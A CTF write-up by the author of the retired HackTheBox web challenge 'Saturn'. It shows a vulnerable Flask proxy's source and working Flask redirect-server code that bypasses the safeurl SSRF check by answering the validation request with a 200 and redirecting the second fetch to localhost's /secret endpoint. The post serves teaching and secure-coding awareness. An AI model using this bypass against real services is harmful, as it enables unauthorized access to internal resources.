---
title: HTB Challenge (Saturn) Writeup
date: 2024-04-17
categories: [ctf, web]
tags: [htb, web, ctf]    # TAG names should be lowercase
---

Hello folks, I developed a web exploitation challenge for HackTheBox - Saturn some months ago. It got retired some days ago, so I thought to publish the writeup with the solution. You can check out the challenge from here: [https://app.hackthebox.com/challenges/saturn](https://app.hackthebox.com/challenges/saturn)

# Challenge:

At the start of the challenge, we are presented with a website offering a proxy service.

![img](https://i.imgur.com/F9vs1lv.jpeg)

Entering a random website in the input field, we get a response back with that site's content.

![img](https://i.imgur.com/irJy4A7.jpeg)

Hmmm interesting. We know that if a server is fetching resources from a user-inputted URL, there is a chance it might be vulnerable to an SSRF vulnerability. To read more about SSRFs, you can read this article:
*https://portswigger.net/web-security/ssrf*

So out first approach is to enter *https://127.0.0.1/* and see how the server behaves. This is the most basic payload to check SSRF. This payload will make the server fetch resource from the localhost, and if the server is vulnerable to SSRFs, the server will sucessfully fetch it's internal resource. 

Entering this payload, we are shown a *Malicious input detected* message indicating that there is some sort of protection implemented on server-side.

![img](https://i.imgur.com/eS5QcXM.jpeg)

Ok, let's look at the source code to see the overall functionality. 

```python
from flask import Flask, request, render_template
import os
import requests
from safeurl import safeurl


app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f"Malicious input detected.")
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')


@app.route('/secret')
def secret():
    if request.remote_addr == '127.0.0.1':
        flag = ""
        with open('./flag.txt') as f:
            flag = f.readline()
        return render_template('secret.html', SECRET=flag)
    else:
        return render_template('forbidden.html'), 403


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=80, threaded=True)
```

Looking at the main *app.py* file, we find something interesting. We can see that it is using ***safeurl*** library to check user inputted URL. Another interesting thing to notice here is the **/secret** endpoint which seems to be giving us the flag. But somehow, this endpoint is only accessible thought localhost.

Let's now look at the *requirements.txt* file to see the versions of libraries/frameworks used in this web app.

```python
Flask==3.0.0
gunicorn==21.2.0
requests==2.31.0
SafeURL-Python==1.3
Werkzeug==3.0.1
```

All the versions are currently the latest ones including *SafeURL-Python*.
We are only left with the choice of fuzzing more SSRF payloads and try our luck.

Let's intercept the POST request to "/" endpoint with burpsuite and send it to intruder. I made custom wordlist of SSRF payloads from here:

*https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md*

Now, let's start our fuzzing.

![img](https://i.imgur.com/ejnQlyJ.jpeg)

We see that all of our payloads got the response of same length with the message "Malicious input detected". All of our payloads were detected by the library which was being used to prevent SSRF. 

Even though, all of our payloads were detected. We can still try some other techniques to bypass this SSRF protection. Most famous one is HTTP redirects. 

HTTP redirect is a technique in which attacker sends URL of his own server rather than server's internal URL and then redirects the server to the localhost. In this way, we are sending an appropriate URL which bypasses all those protections which were detecting SSRF just on the basis of pattern matching. Let's try this.

First, we need to make our own server which redirects any incoming traffic to *http://127.0.0.1/secret*.

```python
from flask import Flask

app = Flask(__name__)

@app.route('/')
def home():
    return redirect("http://127.0.0.1/secret", code=302)

app.run()
```

Now, we need to expose our local server to the internet so Saturn Proxy server can connect to our server. You can use anything for this purpose, I am using localtunnel for this: 

*https://github.com/localtunnel/localtunnel*

You can install localtunnel through npm:

```bash
npm install -g localtunnel
```

After installing, launch localtunnel from this command:

```bash
npx lt -p 5000
```

This will expose our port 5000, connect to the tunnel server, setup the tunnel, and tell you what url to use. (Note that this url will remain active only for the duration of your session. So make sure to run it on separate terminal session)

Alright, now, let's enter our server URL which we got from localtunnel.

![img](https://i.imgur.com/eS5QcXM.jpeg)

Oh, the same message again? Ok, so it seems ***safeurl*** is also checking for HTTP redirecting techniques.

Let's review the source code again to see if we find something interesting there.

Looking at the *index()* function again, we see something strange.

```python
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        try:
            su = safeurl.SafeURL()
            opt = safeurl.Options()
            opt.enableFollowLocation().setFollowLocationLimit(0)
            su.setOptions(opt)
            su.execute(url)
        except:
            return render_template('index.html', error=f"Malicious input detected.")
        r = requests.get(url)
        return render_template('index.html', result=r.text)
    return render_template('index.html')
```

So first, the server is checking our URL through ***safeurl*** library in *try* block and if it generates any exception (if URL contains any payload or if there is any HTTP redirect attack attempt, then it will generate exception), then the function is being returned and we are shown *"Malicious input detected"* error.

But the strange thing is, if our input somehow passes the *try* block with no exception being raised, then the server sends another second request through ***requests*** library which does not check for any SSRF vulnerabilities.

Before exploiting this insecure code, let's first verify this behaviour with a simple server which simply returns normal *200* response. In this way, it will pass the *try* block which is checking for HTTP redirects also. If we get 2 requests back on our server, then this will mean we might be able exploit this flaw.

Let's write a simple server which returns normal 200 response.

```python
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return "Hello World!"

app.run()
```

I again launched this flask server and exposed that through localtunnel as described previously. Now copy the URL which localtunnel gave us and submit it to Saturn Proxy.

![img](https://i.imgur.com/dNP49Hp.jpeg)

Woah, we got 2 requests back on our server. Let's break down these requests further. So, the 1st request is coming from ***safeurl*** library present in the *try* block and the 2nd request is coming from the ***requests*** library. 

So it means, the 2nd request will only be initiated from the server if our 
1st request is safe from SSRFs. But the main thing is, we can control both of these requests through our server. If we somehow make our server to return simple 200 response on the first request, then the *try* block will not generate any exception, and we will make our server to redirect to *http://127.0.0.1/secret* on 2nd request.

Let's make our server pretty quick to check for both of the requests.

```python
import flask
import os, time

app = flask.Flask(__name__)

req_no = 1
lturl = ""

@app.route('/')
def home():
    global req_no
    if req_no==1:
        req_no+=1
        return "Hello World!"
    return flask.redirect("http://127.0.0.1/secret", code=302)

app.run()
```

Again, launch the server, expose with localtunnel and submit URL to Saturn Proxy. We successfully redirected Saturn Proxy to the **/secret** endpoint and got the flag.

This challenge shows that, even though you are using safe libraries to check specific vulnerabilities, they can still be exploited through insecure code practices.


Thankyou for Reading
